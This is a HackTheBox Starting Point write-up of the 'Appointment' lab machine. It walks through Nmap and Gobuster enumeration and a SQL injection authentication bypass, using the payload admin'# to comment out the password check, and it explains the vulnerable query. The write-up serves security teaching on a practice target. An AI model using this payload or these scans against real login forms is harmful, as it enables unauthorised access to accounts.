+++
title = "Appointment"
description = "Starting Point machine focused on web enumeration and the exploitation of SQL Injection."

platform = "HackTheBox"
OS = "Linux"
difficulty = "Very-Easy"

tags = [
"SQL Injection",
"Starting Point",
"Fundamental Exploitation"
]

image = "/images/writeups/Appointment/appointment.png"
+++

### Overview

**Appointment** is a machine from the **Starting Point** path on Hack The Box. It is designed to practice fundamental concepts of web enumeration and exploitation of a **SQL Injection** vulnerability in an authentication form.

The objective is to identify the exposed web service and use SQL injection to modify the authentication query and gain access to the application.

---

### Enumeration

We begin by performing an **Nmap** scan to identify the available web service:

```bash
nmap -sC -sV -p 80 -sS --min-rate 5000 -T4 -Pn <TARGET_IP>
```

The scan shows the following result:

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

Port `80/tcp` is open and corresponds to the **HTTP** service. Nmap also identifies that the application is running **Apache 2.4.38 on Debian**.

The application title is identified as:

```text
Login
```

We continue with directory enumeration using **Gobuster**:

```bash
gobuster dir -u http://<TARGET_IP> -w big.txt
```

Among the results, we find several directories related to the application's resources:

```text
css       (Status: 301)
fonts     (Status: 301)
images    (Status: 301)
js        (Status: 301)
vendor    (Status: 301)
```

The main application presents a login form.

---

### Initial Access

After analyzing the authentication form, we identify that the username field may be susceptible to **SQL Injection**.

To understand how the vulnerability works, we can represent the SQL query used by the application in a simplified form:

```sql
SELECT * FROM usuarios WHERE email = 'USER_INPUT' AND password = 'USER_INPUT';
```

The application incorporates the values entered by the user into the SQL query to verify the credentials.

The issue occurs when user-controlled input can modify the structure of the SQL query instead of being treated only as data.

In the username field, we enter:

![sqli.es.png](/images/writeups/Appointment/login_bypass.png)

The payload can be divided into three parts:

```text
admin  → value we want to use as the username
'      → closes the quote delimiting the username value
#      → starts a SQL comment
```

After entering the payload, the query can be represented as follows:

```sql
SELECT * FROM usuarios WHERE email = 'admin'#' AND password = 'USER_INPUT';
```

The `#` character causes everything that follows it to be interpreted as a comment. Therefore, the portion corresponding to the password is no longer part of the executed query.

The effective query is simplified to:

```sql
SELECT * FROM usuarios WHERE email = 'admin';
```

In this way, the application only checks whether a user matching `admin` exists, without validating the password.

The payload allows us to perform an **authentication bypass** and access the application without providing a valid password.

![sqli.es.png](/images/writeups/Appointment/sqli.en.png)

---

### Flag

After gaining access through the SQL injection, we obtain the flag provided by the machine.

Retrieving the flag confirms that the authentication bypass was successful and allows us to complete **Appointment**.

![login\_ok.png](/images/writeups/Appointment/login_ok.png)

---

### Conclusion

**Appointment** presents a straightforward scenario based on the enumeration of a web service and the exploitation of a **SQL Injection** vulnerability in an authentication form.

The process followed was:

```text
Enumeration
    ↓
Port 80 Identification
    ↓
HTTP Service Detection
    ↓
Directory Enumeration
    ↓
Login Form Identification
    ↓
SQL Injection
    ↓
Payload: admin'#
    ↓
Commenting Out the Remaining Query
    ↓
Authentication Bypass
    ↓
Flag Retrieval
```

Despite its **Very Easy** difficulty, the machine provides a practical understanding of how user-controlled input can modify an SQL query and directly affect an application's authentication mechanism.

---

### [Status: Completed](https://labs.hackthebox.com/achievement/machine/3933963/402)
